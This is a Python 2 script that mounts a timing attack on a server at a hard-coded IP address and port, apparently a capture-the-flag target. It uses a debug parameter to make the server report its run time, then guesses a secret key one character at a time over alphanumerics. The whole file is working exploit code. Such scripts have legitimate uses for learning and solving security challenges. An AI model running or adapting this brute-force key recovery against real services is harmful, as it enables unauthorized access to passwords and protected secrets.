#!/usr/bin/env python


# Timming attack: check password character by character, when time increments
# next character is valid

import httplib
import urllib



# Connection data
HOST = "54.83.207.90"
PORT = 4242
METHOD = "POST"
PATH = "?debug=1" # To make the server output its run time

# Run time when no character is correct
START_RUN_TIME = 1e-05

# If this string is present in the answer, the key is wrong
WRONG_KEY_STRING = "<h1>Oh, god, you got it wrong!</h1>"
# String preceding the run time
TOTAL_RUN_STRING = "Total run:"

# The input value to send to server, as received from stdin
INPUT = raw_input()

# The data posted is the input plus the key
POST_DATA = {
	"input": INPUT,
	"key": ""
}

# Possible characters in the password: [0-9a-zA-Z]
POSSIBLE_CHARACTERS = [ chr(c) for c in range(ord("0"), ord("9")+1) + range(ord("a"), ord("z")+1) + range(ord("A"), ord("Z")+1) ]



# Return the next minimum run time for the given key length and the previous
# run time
def get_next_run_time(prev_run_time, keylen):
	# This formula describes the server behaviour: prev * (1 + 2/keylen)
	# If keylen is 0, multiplier is 1000
	run_time_multiplier = (1 + 2.0/keylen) if keylen > 0 else 1000
	return prev_run_time * run_time_multiplier


# Starts with the initial key (can be empty) and run time, and returns the
# complete key
# It's recursive, and each call gets the next character of the key
def get_key(key, run_time):
	# Get the minimum run time needed to accept the character as valid
	min_run_time = get_next_run_time(run_time, len(key))
	
	for char in POSSIBLE_CHARACTERS:
		possible_key = key + char
		
		# Send the possible_key
		POST_DATA["key"] = possible_key
		con.request(METHOD, PATH, urllib.urlencode(POST_DATA))
		resp = con.getresponse().read()
		
		# Check if the complete key is correct
		if resp.find(WRONG_KEY_STRING) == -1:
			# No WRONG_KEY string found, key is correct! Return it
			return possible_key
		else:
			# Get the run time from server
			run_time = float(resp.split(TOTAL_RUN_STRING)[1].splitlines()[0])
			# Check if it exceeds the minimum run time
			if run_time > min_run_time:
				# Minimum run time exceeded, character is valid
				# Go to the next one
				return get_key(possible_key, min_run_time)
	
	# No valid character, key not found
	return ""



# Create an HTTP connection, used for all requests
con = httplib.HTTPConnection(HOST, PORT)

print get_key("", START_RUN_TIME)

con.close()

